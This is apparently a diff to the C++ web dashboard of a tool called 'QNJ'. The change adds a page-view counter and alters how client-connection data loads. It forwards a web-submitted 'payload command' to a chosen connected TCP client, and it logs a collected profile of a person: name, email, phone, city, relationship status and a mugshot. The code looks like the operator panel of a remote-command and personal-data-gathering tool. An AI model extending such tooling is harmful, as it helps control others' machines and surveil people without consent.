@@ -9,6 +9,7 @@
 #include "../lib/signup_save_data.h"
 #include "../networking/send_html_files.hpp"
 #include "../networking/send_html_client_side.hpp"
+#include "../networking/html_page.h"
 #include "../networking/utils/get_login_credentials.hpp"
 #include "../networking/Parse_stuff/parse_page.hpp"
 #include "../networking/Parse_stuff/parse_file_upload.hpp"
@@ -19,11 +20,12 @@
 #include "../networking/http/DIRECT_TO-PAGE.hpp"
 #include "../networking/http/DIRECT-REMOVE-COOKIE.hpp"
 #include "../save_user_signup.h"
+#include "../json/save_tcp_client_connections.hpp"
 
 void get_path_handler(const std::string& path, std::string& userIdCookieValue, std::string& data0x00UserIdCookieValue, int client_socket, std::string& requestHeaders);
 void post_path_handler(const std::string& path, std::string& userIdCookieValue, std::string& data0x00UserIdCookieValue, int client_socket, std::string& requestHeaders);
 //auto quick_return_client_data() { return returned_client_data_string(); }
-int page_views;
+
 
 void path_handler(const std::string& method, const std::string& path, int client_socket, std::string& userIdCookieValue, std::string& data0x00UserIdCookieValue, std::string& requestHeaders)
 {
@@ -73,6 +75,9 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
             std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
             client_side_data += get_username_from_database();
             client_side_data += "</span>";
+            client_side_data += "<span id='QNJ-page-views'>";
+            client_side_data += std::to_string(page_views);
+            client_side_data += "</span>";
             client_side_data += "<script src='/QNJ-Cloud/js/dashboard.js'></script>";
             replace_char(client_side_data, "%40", "@");
             content_send_file_w_client_side("/home/magician/Desktop/QNJ/web-gui/dashboard.html", "text/html", "200 OK", "HTTP/1.1", client_socket, client_side_data);
@@ -91,7 +96,7 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
             client_side_data += get_username_from_database();
             client_side_data += "</span>";
             client_side_data += "<span id='QNJ-CONNECTIONS-DATA-SP'>";
-            client_side_data += extract_client_vector_data();
+            client_side_data += return_client_connections_file();
             client_side_data += "</span>";
             client_side_data += "<script src='/QNJ-Cloud/js/dashboard.js'></script>";
             replace_char(client_side_data, "%40", "@");
@@ -358,8 +363,7 @@ void post_path_handler(const std::string& path, std::string& userIdCookieValue, 
     {
         std::string cmd_value = parsePostData(requestHeaders, "QNJ-PAYLOAD-CMD=");
         std::string QNJ_client_id = parsePostData(requestHeaders, "QNJ-PAYLOAD-CMD-CLIENT-ID="); 
-        std::thread send_tcp_clients_command_data([&]() { send_tcp_commands_to_client(cmd_value, QNJ_client_id); });
-        send_tcp_clients_command_data.join();
+        send_tcp_commands_to_client(cmd_value, QNJ_client_id);
         sendRedirect("/dashboard/payloads", client_socket);
     }
 
@@ -459,10 +463,16 @@ void post_path_handler(const std::string& path, std::string& userIdCookieValue, 
                 std::string children_amount = parsePostData(requestHeaders, "QNJ-data-0x00-children-name=");
                 std::string user_mugshot_pic = parsePostData(requestHeaders, "QNJ-data-0x00-userpic-name=");
 
-                std::cout << requestHeaders << "\n";
-
-                requestHeaders.clear();
-
+                std::cout << "First name: " << first_name << std::endl;
+                std::cout << "Last name: " << last_name << std::endl;
+                std::cout << "Age: " << age << std::endl;
+                std::cout << "Gender: " << gender << std::endl;
+                std::cout << "Email: " << email << std::endl;
+                std::cout << "Phonenumber: " << phonenumber << std::endl;
+                std::cout << "Country: " << country << std::endl;
+                std::cout << "City: " << city << std::endl;
+                std::cout << "Relation ship stat: " << material_status << std::endl;
+                std::cout << "Mugshot pic: " << user_mugshot_pic << std::endl;
                             
                 sendRedirect("/dashboard/data-0x00", client_socket);
             }
